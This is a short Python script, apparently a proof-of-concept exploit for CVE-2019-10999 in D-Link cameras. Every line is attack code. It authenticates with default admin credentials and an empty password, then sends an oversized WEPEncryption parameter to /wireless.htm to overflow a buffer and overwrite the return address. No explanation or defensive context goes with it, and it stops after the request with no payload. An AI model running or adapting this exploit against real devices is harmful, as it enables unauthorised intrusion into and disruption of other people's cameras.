import requests


def dlink_cve_2019_10999(ip):
	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Connection': 'keep-alive',
		'Referer': 'http://' + ip + '/setSystemWireless',
		'Upgrade-Insecure-Requests': '1'
	}

	session = requests.session()
	session.auth = ('admin', '')
	data = '?WEPEncryption=' + 'A' * 0x28 + 'B' * 0x4
	res = session.get(url='http://' + ip + '/wireless.htm' + data, headers=headers)
